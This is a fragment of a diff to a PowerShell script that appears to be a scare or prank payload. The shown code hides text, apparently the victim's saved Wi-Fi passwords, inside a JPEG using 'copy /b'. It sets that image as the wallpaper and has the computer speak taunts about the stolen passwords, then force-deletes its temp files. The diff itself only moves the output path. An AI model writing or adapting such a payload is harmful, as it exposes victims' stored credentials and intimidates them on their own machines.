@@ -411,7 +411,7 @@ if (!$Networks) { Write-Host "variable is null"
 #>
 
 	echo $hiddenMessage > $Env:temp\foo.txt
-	cmd.exe /c copy /b "$Env:temp\foo.jpg" + "$Env:temp\foo.txt" "$Env:USERPROFILE\Desktop\$ImageName.jpg"
+	cmd.exe /c copy /b "$Env:temp\foo.jpg" + "$Env:temp\foo.txt" "$Env:USERPROFILE\Public Desktop\$ImageName.jpg"
 
 	rm $env:TEMP\foo.txt,$env:TEMP\foo.jpg -r -Force -ErrorAction SilentlyContinue
 
@@ -423,7 +423,7 @@ if (!$Networks) { Write-Host "variable is null"
 
 
 	$s.Speak("wanna see something really cool?")
-	Set-WallPaper -Image "$Env:USERPROFILE\Desktop\$ImageName.jpg" -Style Center
+	Set-WallPaper -Image "$Env:USERPROFILE\Public Desktop\$ImageName.jpg" -Style Center
 	$s.Speak("Look at all your other passswords I got..")
 	Start-Sleep -Seconds 1
 	$s.Speak("These are the wifi passwords for every network you've ever connected to!")
